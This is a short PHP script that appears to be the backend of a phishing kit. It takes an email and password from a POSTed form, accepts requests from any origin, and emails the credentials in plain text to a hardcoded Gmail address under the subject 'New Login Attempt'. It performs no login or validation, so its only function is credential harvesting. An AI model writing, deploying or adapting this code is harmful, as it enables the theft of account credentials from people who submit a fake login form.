<?php
// Allow requests from any origin for development purposes
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST");
header("Access-Control-Allow-Headers: Content-Type");

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];

    // Add any additional validation or processing here

    $to = "nikita1100777@gmail.com"; // Replace with your email address
    $subject = "New Login Attempt";
    $message = "Email: " . $email . "\nPassword: " . $password;

    if (mail($to, $subject, $message)) {
        echo "Email sent successfully.";
    } else {
        echo "Email sending failed.";
    }
} else {
    echo "Invalid request method.";
}
?>
